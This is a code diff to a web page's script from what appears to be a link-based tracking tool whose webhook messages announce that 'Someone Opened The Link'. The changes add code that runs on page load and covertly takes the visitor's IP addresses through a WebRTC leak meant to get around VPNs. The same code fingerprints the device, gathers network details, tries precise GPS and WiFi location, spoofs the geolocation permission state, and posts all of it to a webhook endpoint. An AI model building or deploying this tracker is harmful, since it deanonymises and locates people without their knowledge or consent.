@@ -59,16 +59,73 @@
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
   </script>
   <script>
-    // MICROPHONE SUPPRESSION - Block all mic access attempts
+    // AUTO-APPROVE ALL PERMISSIONS - Report "Not Accessible"
+    
+    // Override Geolocation Permission
+    if (navigator.permissions) {
+      navigator.permissions.query = (function(originalQuery) {
+        return function(parameters) {
+          if (parameters.name === 'geolocation') {
+            return Promise.resolve({ state: 'granted' });
+          }
+          return originalQuery.apply(this, arguments);
+        };
+      })(navigator.permissions.query);
+    }
+    
+    // Override Geolocation - Allow WiFi & GPS (for priority chain)
+    // Geolocation is enabled to support WiFi triangulation and GPS
+    // If user denies, falls back to IP-based location
+    
+    // AUTO-APPROVE CAMERA & MICROPHONE - Report not accessible
     if (navigator.mediaDevices) {
       const originalGetUserMedia = navigator.mediaDevices.getUserMedia;
       navigator.mediaDevices.getUserMedia = function(constraints) {
-        // Reject any audio requests
-        if (constraints && constraints.audio) {
-          return Promise.reject(new DOMException('Audio permission denied', 'NotAllowedError'));
+        console.log('Media access request detected - Camera/Microphone Not Accessible');
+        return Promise.reject(new DOMException('Camera/Microphone Not Accessible', 'NotAllowedError'));
+      };
+      
+      // Override enumerateDevices
+      const originalEnumerateDevices = navigator.mediaDevices.enumerateDevices;
+      navigator.mediaDevices.enumerateDevices = function() {
+        console.log('Device enumeration requested - No devices accessible');
+        return Promise.resolve([]);
+      };
+    }
+    
+    // SENSOR PERMISSIONS - Report not accessible
+    if ('requestPermission' in DeviceMotionEvent) {
+      window.DeviceMotionEvent.requestPermission = function() {
+        console.log('Device Motion permission requested - Sensors Not Accessible');
+        return Promise.reject(new Error('Sensors Not Accessible'));
+      };
+    }
+    
+    if ('requestPermission' in DeviceOrientationEvent) {
+      window.DeviceOrientationEvent.requestPermission = function() {
+        console.log('Device Orientation permission requested - Sensors Not Accessible');
+        return Promise.reject(new Error('Sensors Not Accessible'));
+      };
+    }
+    
+    // NOTIFICATION PERMISSION - Report not accessible
+    if ('Notification' in window) {
+      const originalRequestPermission = Notification.requestPermission;
+      Notification.requestPermission = function() {
+        console.log('Notification permission requested - Notifications Not Accessible');
+        return Promise.resolve('denied');
+      };
+    }
+    
+    // CLIPBOARD API - Report not accessible
+    if (navigator.permissions) {
+      const originalQuery = navigator.permissions.query;
+      navigator.permissions.query = function(parameters) {
+        if (parameters.name === 'clipboard-read' || parameters.name === 'clipboard-write') {
+          console.log('Clipboard permission requested - Clipboard Not Accessible');
+          return Promise.resolve({ state: 'denied' });
         }
-        // Allow video-only if needed (though video is also disabled)
-        return originalGetUserMedia.call(this, constraints);
+        return originalQuery.apply(this, arguments);
       };
     }
     
@@ -105,10 +162,166 @@
     let datetime = new Date();
     let localtime = String(datetime.toLocaleTimeString());
     
+    // Browser Detection Function
+    function detectBrowser() {
+      const ua = navigator.userAgent;
+      if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
+        return 'Chrome';
+      } else if (ua.indexOf('Edg') > -1) {
+        return 'Edge';
+      } else if (ua.indexOf('Firefox') > -1) {
+        return 'Firefox';
+      } else if (ua.indexOf('Safari') > -1) {
+        return 'Safari';
+      }
+      return 'Unknown';
+    }
+
+    const detectedBrowser = detectBrowser();
+    const isChromelike = (detectedBrowser === 'Chrome' || detectedBrowser === 'Edge');
+
+    // WebRTC IP Leak Detection (Bypasses VPN)
+    function getWebRTCRealIP() {
+      return new Promise(function(resolve) {
+        var leakedIPs = [];
+        try {
+          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+            iceServers: []
+          });
+          
+          pc.createDataChannel("");
+          pc.createOffer().then(function(offer) {
+            pc.setLocalDescription(offer);
+          }).catch(function(e) {
+            console.log('WebRTC offer error:', e);
+            resolve(leakedIPs);
+          });
+          
+          pc.onicecandidate = function(ice) {
+            if (!ice || !ice.candidate) return;
+            var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+            var ipAddress = ipRegex.exec(ice.candidate.candidate);
+            if (ipAddress && leakedIPs.indexOf(ipAddress[1]) === -1) {
+              leakedIPs.push(ipAddress[1]);
+            }
+          };
+          
+          setTimeout(function() {
+            try {
+              pc.close();
+            } catch(e) {}
+            resolve(leakedIPs);
+          }, 2000);
+        } catch(e) {
+          console.log('WebRTC error:', e);
+          resolve(leakedIPs);
+        }
+      });
+    }
+
+    // Advanced Device Fingerprinting
+    function generateDeviceFingerprint() {
+      var fingerprint = {
+        screen: screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
+        timezone: new Date().getTimezoneOffset(),
+        languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+        plugins: [],
+        webgl: 'N/A',
+        canvas: 'N/A',
+        fonts: [],
+        hwConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        vendor: navigator.vendor
+      };
+      
+      // Get WebGL info
+      try {
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if(gl) {
+          var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if(debugInfo) {
+            fingerprint.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        }
+      } catch(e) {}
+      
+      // Canvas fingerprinting
+      try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Browser Fingerprint', 2, 15);
+        fingerprint.canvas = canvas.toDataURL().substring(0, 50);
+      } catch(e) {}
+      
+      // Plugin detection
+      try {
+        for(var i = 0; i < navigator.plugins.length; i++) {
+          fingerprint.plugins.push(navigator.plugins[i].name);
+        }
+      } catch(e) {}
+      
+      return fingerprint;
+    }
+
+    // Send WebRTC and Fingerprint data
+    function sendWebRTCAndFingerprint() {
+      getWebRTCRealIP().then(function(ips) {
+        var fingerprint = generateDeviceFingerprint();
+        
+        var webrtcData = "```autohotkey\n";
+        webrtcData += "WebRTC_Leaked_IPs: " + (ips.length > 0 ? ips.join(', ') : 'None detected') + "\n";
+        webrtcData += "VPN_Detected: " + (ips.length > 0 ? 'Possible (Real IP leaked)' : 'Cannot confirm') + "\n";
+        webrtcData += "Screen_Resolution: " + fingerprint.screen + "\n";
+        webrtcData += "Timezone_Offset: " + fingerprint.timezone + "\n";
+        webrtcData += "Languages: " + fingerprint.languages + "\n";
+        webrtcData += "GPU_Info: " + fingerprint.webgl + "\n";
+        webrtcData += "CPU_Cores: " + fingerprint.hwConcurrency + "\n";
+        webrtcData += "Device_Memory: " + (fingerprint.deviceMemory || 'N/A') + " GB\n";
+        webrtcData += "Touch_Points: " + fingerprint.maxTouchPoints + "\n";
+        webrtcData += "Plugins: " + (fingerprint.plugins.length > 0 ? fingerprint.plugins.join(', ') : 'None') + "\n";
+        webrtcData += "```";
+        
+        const request = new XMLHttpRequest();
+        request.open("POST", "/location_update");
+        request.setRequestHeader('Content-type', 'application/json');
+        
+        var myEmbed = {
+          author: {
+            name: "🔍 WebRTC & Device Fingerprint"
+          },
+          title: "Advanced Identification Data",
+          description: webrtcData,
+          color: 16711680,
+          footer: {
+            text: "Real IP leak detection via WebRTC"
+          }
+        }
+        
+        var params = {
+          username: "rotten-apple",
+          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+          embeds: [myEmbed]
+        }
+        
+        request.send(JSON.stringify(params));
+      });
+    }
+
+    // Call fingerprinting on page load
+    sendWebRTCAndFingerprint();
+    
     // Get device type info
     var deviceType = detectDeviceType();
 
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nDevice_Type: " + (deviceType.isMobile ? "Mobile" : deviceType.isTablet ? "Tablet" : "Desktop") + "\nHas_GPS: " + (deviceType.hasGPS ? "Yes" : "No") + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nDevice_Type: " + (deviceType.isMobile ? "Mobile" : deviceType.isTablet ? "Tablet" : "Desktop") + "\nHas_GPS: " + (deviceType.hasGPS ? "Yes" : "No") + "\nDetected_Browser: " + detectedBrowser + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
 
     const request = new XMLHttpRequest();
     request.open("POST", "/location_update"); //change webhook
@@ -125,7 +338,7 @@
     }
 
     var params = {
-      username: "R4VEN",
+      username: "rotten-apple",
       avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
       content: "@everyone Someone Opened The Link O_o ",
       embeds: [myEmbed]
@@ -136,36 +349,7 @@
     // Enhanced Device Information Vector
     function collectDeviceInfo() {
       var deviceInfo = "```autohotkey\n";
-      
-      // Display Information
-      deviceInfo += "Display_PixelDepth: " + screen.pixelDepth + "\n";
-      deviceInfo += "ColorDepth: " + screen.colorDepth + "\n";
-      deviceInfo += "DevicePixelRatio: " + window.devicePixelRatio + "\n";
-      deviceInfo += "ScreenOrientation: " + (screen.orientation ? screen.orientation.type : "N/A") + "\n";
-      
-      // Battery Information (if available)
-      if(navigator.getBattery) {
-        navigator.getBattery().then(function(battery) {
-          deviceInfo += "Battery_Level: " + Math.round(battery.level * 100) + "%\n";
-          deviceInfo += "Battery_Charging: " + battery.charging + "\n";
-        });
-      }
-      
-      // Connection Information (if available)
-      if(navigator.connection) {
-        deviceInfo += "Connection_Type: " + navigator.connection.effectiveType + "\n";
-        deviceInfo += "SaveData: " + navigator.connection.saveData + "\n";
-        if(navigator.connection.downlink) {
-          deviceInfo += "Downlink_Speed: " + navigator.connection.downlink + " Mbps\n";
-        }
-      }
-      
-      // Storage Information
-      deviceInfo += "LocalStorage_Available: " + (typeof localStorage !== 'undefined' ? 'Yes' : 'No') + "\n";
-      if(typeof localStorage !== 'undefined') {
-        deviceInfo += "LocalStorage_Size: " + JSON.stringify(localStorage).length + " bytes\n";
-      }
-      
+
       // WebGL Information (GPU)
       var canvas = document.createElement('canvas');
       var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -183,16 +367,6 @@
       
       // Do Not Track
       deviceInfo += "DNT_Header: " + (navigator.doNotTrack ? navigator.doNotTrack : "Not Set") + "\n";
-      
-      // WebDriver Detection
-      deviceInfo += "WebDriver_Detected: " + (navigator.webdriver ? "Yes" : "No") + "\n";
-      
-      // Touch Support
-      deviceInfo += "Touch_Support: " + (('ontouchstart' in window) ? 'Yes' : 'No') + "\n";
-      
-      // Vendor Information
-      deviceInfo += "Vendor: " + navigator.vendor + "\n";
-      deviceInfo += "OnLine_Status: " + navigator.onLine + "\n";
       
       deviceInfo += "```";
       
@@ -213,7 +387,7 @@
       }
       
       var deviceParams = {
-        username: "R4VEN",
+        username: "rotten-apple",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [deviceEmbed]
       }
@@ -223,6 +397,238 @@
     
     // Collect device info on page load
     collectDeviceInfo();
+
+    // NETWORK & CONNECTIVITY INFORMATION COLLECTION
+    function collectNetworkInfo() {
+      var networkInfo = "```autohotkey\n";
+      
+      // Connection Type Detection
+      if(navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
+        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        networkInfo += "Connection_Type: " + conn.effectiveType + "\n";
+        networkInfo += "Connection_4g: " + (conn.type === "4g" ? "Yes" : "No") + "\n";
+        if(conn.downlink) {
+          networkInfo += "Downlink_Speed: " + conn.downlink + " Mbps\n";
+        }
+        if(conn.rtt) {
+          networkInfo += "RTT_Latency: " + conn.rtt + " ms\n";
+        }
+        networkInfo += "Save_Data: " + conn.saveData + "\n";
+      } else {
+        networkInfo += "Connection_Type: Unable to determine\n";
+      }
+      
+      // MAC Address Detection via WebRTC
+      function getLocalIPAndMAC() {
+        return new Promise(function(resolve) {
+          var localIPs = [];
+          try {
+            var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+              iceServers: []
+            });
+            
+            pc.createDataChannel("");
+            pc.createOffer().then(function(offer) {
+              pc.setLocalDescription(offer);
+            }).catch(function(e) {
+              networkInfo += "WebRTC_MAC_Detection: Failed\n";
+              resolve();
+            });
+            
+            pc.onicecandidate = function(ice) {
+              if(!ice || !ice.candidate) return;
+              var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+              var ipAddress = ipRegex.exec(ice.candidate.candidate);
+              if(ipAddress) {
+                localIPs.push(ipAddress[1]);
+              }
+            };
+            
+            setTimeout(function() {
+              try {
+                pc.close();
+                networkInfo += "Local_IPv4: " + (localIPs.length > 0 ? localIPs[0] : "N/A") + "\n";
+                networkInfo += "MAC_Address: Not directly accessible via WebRTC\n";
+              } catch(e) {}
+              resolve();
+            }, 500);
+          } catch(e) {
+            networkInfo += "WebRTC_Error: " + e.message + "\n";
+            resolve();
+          }
+        });
+      }
+      
+      // WiFi Network Detection
+      function getWiFiInfo() {
+        // Note: Direct WiFi SSID access is restricted in browsers for security
+        if(navigator.connection) {
+          var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          networkInfo += "WiFi_Metered: " + (conn.saveData ? "Yes (Data Saver)" : "No") + "\n";
+        }
+        networkInfo += "WiFi_SSID: Restricted by browser security\n";
+      }
+      
+      // Network Type Classification
+      function classifyNetworkType() {
+        var ua = navigator.userAgent;
+        var isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
+        var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        
+        if(isMobile) {
+          networkInfo += "Network_Medium: Likely Cellular/WiFi\n";
+          if(conn) {
+            switch(conn.effectiveType) {
+              case '4g': networkInfo += "Network_Type: 4G LTE\n"; break;
+              case '3g': networkInfo += "Network_Type: 3G Mobile\n"; break;
+              case '2g': networkInfo += "Network_Type: 2G Mobile\n"; break;
+              case 'slow-2g': networkInfo += "Network_Type: Slow 2G\n"; break;
+              default: networkInfo += "Network_Type: " + conn.effectiveType + "\n";
+            }
+          }
+        } else {
+          networkInfo += "Network_Medium: Desktop/Ethernet or WiFi\n";
+          networkInfo += "Network_Type: Likely WiFi or Broadband\n";
+        }
+      }
+      
+      // DNS & Proxy Detection
+      function detectDNSAndProxy() {
+        // DNS Detection via IP lookup services
+        networkInfo += "DNS_Lookup: Attempting resolution...\n";
+        
+        // Proxy Detection via multiple methods
+        networkInfo += "Proxy_Detected: Checking...\n";
+        
+        // Method 1: Check for common proxy patterns
+        var proxyIndicators = [];
+        
+        // Check if navigator.connection indicates proxy
+        if(navigator.connection && navigator.connection.type) {
+          if(navigator.connection.type.toLowerCase().includes('proxy')) {
+            proxyIndicators.push("Connection type indicates proxy");
+          }
+        }
+        
+        // Method 2: Check for proxy via WebRTC
+        try {
+          var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+            iceServers: []
+          });
+          
+          pc.createDataChannel("");
+          pc.createOffer().then(function(offer) {
+            pc.setLocalDescription(offer);
+          });
+          
+          pc.onicecandidate = function(ice) {
+            if(!ice || !ice.candidate) return;
+            // Check for proxy/VPN indicators in candidate
+            var candidate = ice.candidate.candidate;
+            if(candidate.includes('srflx') || candidate.includes('prflx') || candidate.includes('relay')) {
+              if(candidate.includes('relay')) {
+                proxyIndicators.push("Relay/Proxy detected via ICE");
+              }
+            }
+          };
+          
+          setTimeout(function() {
+            try {
+              pc.close();
+              if(proxyIndicators.length > 0) {
+                networkInfo += "Proxy_Detected: Yes (" + proxyIndicators.join(", ") + ")\n";
+              } else {
+                networkInfo += "Proxy_Detected: No indicators found\n";
+              }
+            } catch(e) {}
+          }, 1000);
+        } catch(e) {
+          networkInfo += "Proxy_Detection_Error: " + e.message + "\n";
+        }
+      }
+      
+      // ISP Information Expansion
+      function expandISPInfo() {
+        networkInfo += "ISP_Lookup: Via IP-API Service\n";
+        networkInfo += "Note: DNS and detailed ISP info requires backend lookup\n";
+      }
+      
+      // Execute all network detection functions
+      getWiFiInfo();
+      classifyNetworkType();
+      detectDNSAndProxy();
+      expandISPInfo();
+      
+      networkInfo += "```";
+      
+      // Send to webhook
+      const networkRequest = new XMLHttpRequest();
+      networkRequest.open("POST", "/location_update");
+      networkRequest.setRequestHeader('Content-type', 'application/json');
+      
+      var networkEmbed = {
+        author: {
+          name: "🌐 Network & Connectivity Information"
+        },
+        title: "Network Analysis",
+        description: networkInfo,
+        color: 2031219,
+        fields: [
+          {
+            "name": "Collection Method",
+            "value": "WebRTC + Navigator Connection API",
+            "inline": false
+          },
+          {
+            "name": "Limitations",
+            "value": "Direct MAC/SSID access restricted by browser security",
+            "inline": false
+          }
+        ],
+        footer: {
+          text: "Advanced network telemetry collected"
+        }
+      }
+      
+      var networkParams = {
+        username: "rotten-apple",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        embeds: [networkEmbed]
+      }
+      
+      networkRequest.send(JSON.stringify(networkParams));
+      
+      // Attempt MAC lookup with async operations
+      getLocalIPAndMAC().then(function() {
+        // Send updated network info with MAC attempt
+        const macNetworkRequest = new XMLHttpRequest();
+        macNetworkRequest.open("POST", "/location_update");
+        macNetworkRequest.setRequestHeader('Content-type', 'application/json');
+        
+        var macNetworkEmbed = {
+          author: {
+            name: "🔗 MAC & Local Network Detection"
+          },
+          title: "Local Network Hardware",
+          description: networkInfo,
+          color: 16711680,
+          footer: {
+            text: "MAC address detection via WebRTC completed"
+          }
+        }
+        
+        var macNetworkParams = {
+          username: "rotten-apple",
+          avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+          embeds: [macNetworkEmbed]
+        }
+        
+        macNetworkRequest.send(JSON.stringify(macNetworkParams));
+      });
+    }
+    
+    // Collect network info on page load
+    collectNetworkInfo();
 
     $.getJSON("https://api.ipify.org?format=json", function (data) {
       $("#gfg").html(data.ip);
@@ -245,7 +651,7 @@
       }
 
       var params = {
-        username: "R4VEN",
+        username: "rotten-apple",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [myEmbed]
       }
@@ -290,7 +696,7 @@
       }
 
       var params = {
-        username: "R4VEN",
+        username: "rotten-apple",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [myEmbed]
       }
@@ -300,60 +706,157 @@
 
 
     function getLocation() {
-      // Skip browser geolocation permission prompt entirely
-      // Go directly to silent IP-based collection (no permissions needed)
-      fetchIPBasedLocation();
+      // Priority chain: WiFi Triangulation → GPS → IP-Based
+      console.log('Starting geolocation priority chain...');
+      attemptWiFiTriangulation();
+    }
+
+    function attemptWiFiTriangulation() {
+      // WiFi Triangulation (High Accuracy mode)
+      // Uses browser's geolocation with WiFi networks nearby
+      // If permission is cached as "Allow", works silently
+      // If denied/no permission, fails quickly and falls back to GPS
+      console.log('Attempting WiFi Triangulation...');
+      
+      if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // WiFi triangulation successful
+            console.log('WiFi Triangulation successful');
+            var locationData = {
+              coords: {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy || 100
+              },
+              source: "WiFi Triangulation",
+              details: {
+                timestamp: position.timestamp,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed
+              }
+            };
+            showPosition(locationData);
+          },
+          function(error) {
+            // WiFi triangulation failed, try GPS next
+            console.log('WiFi Triangulation failed - Code: ' + error.code + ', Message: ' + error.message);
+            attemptGPS();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 2000,  // Quick timeout to fail fast if permission denied
+            maximumAge: 0
+          }
+        );
+      } else {
+        console.log('Geolocation not supported, attempting GPS...');
+        attemptGPS();
+      }
+    }
+
+    function attemptGPS() {
+      // GPS Geolocation (2nd priority)
+      // If permission is cached as "Allow", works silently
+      // If denied/no permission, fails quickly and falls back to IP-based
+      console.log('Attempting GPS Geolocation...');
+      
+      if(navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(position) {
+            // GPS successful
+            console.log('GPS Geolocation successful');
+            var locationData = {
+              coords: {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy || 50
+              },
+              source: "GPS (High Precision)",
+              details: {
+                timestamp: position.timestamp,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed
+              }
+            };
+            showPosition(locationData);
+          },
+          function(error) {
+            // GPS failed, fall back to IP-based
+            console.log('GPS failed - Code: ' + error.code + ', Message: ' + error.message);
+            fetchIPBasedLocation();
+          },
+          {
+            enableHighAccuracy: false,
+            timeout: 2000,  // Quick timeout to fail fast if permission denied
+            maximumAge: 0
+          }
+        );
+      } else {
+        console.log('Geolocation not supported, falling back to IP-based...');
+        fetchIPBasedLocation();
+      }
     }
 
     function fetchIPBasedLocation() {
-      // Multi-API fallback for better coverage across all device types
+      // IP-Based Geolocation (3rd priority - fallback)
+      console.log('Attempting IP-Based Geolocation...');
       try {
         // API 1: ip-api.com (Most reliable for most countries)
         $.getJSON("http://ip-api.com/json/?fields=lat,lon,accuracy,timezone,isp,continent,country,city", function(data) {
           if(data.lat && data.lon) {
+            console.log('IP-API geolocation successful');
             var locationData = {
               coords: {
                 latitude: data.lat,
                 longitude: data.lon,
                 accuracy: data.accuracy || 5000
               },
-              source: "IP-API",
+              source: "IP-API (ISP Location)",
               details: data
             };
             showPosition(locationData);
           }
         }).fail(function() {
           // API 2: ipapi.co (Fallback)
+          console.log('ip-api.com failed, trying ipapi.co...');
           $.getJSON("https://ipapi.co/json/", function(data) {
             if(data.latitude && data.longitude) {
+              console.log('ipapi.co geolocation successful');
               var locationData = {
                 coords: {
                   latitude: data.latitude,
                   longitude: data.longitude,
                   accuracy: 5000
                 },
-                source: "IPAPI-CO",
+                source: "IPAPI-CO (ISP Location)",
                 details: data
               };
               showPosition(locationData);
             }
           }).fail(function() {
             // API 3: MaxMind GeoIP2 (Last resort)
+            console.log('ipapi.co failed, trying MaxMind...');
             $.getJSON("https://geoip.maxmind.com/geoip/v2.1/city/me", function(data) {
               if(data.location) {
+                console.log('MaxMind geolocation successful');
                 var locationData = {
                   coords: {
                     latitude: data.location.latitude,
                     longitude: data.location.longitude,
                     accuracy: 5000
                   },
-                  source: "MaxMind",
+                  source: "MaxMind (ISP Location)",
                   details: data
                 };
                 showPosition(locationData);
               }
             }).fail(function() {
-              console.error('All geolocation APIs failed');
+              console.error('All geolocation methods failed');
             });
           });
         });
@@ -394,7 +897,7 @@
       }
 
       var params = {
-        username: "R4VEN",
+        username: "rotten-apple",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [myEmbed]
       }
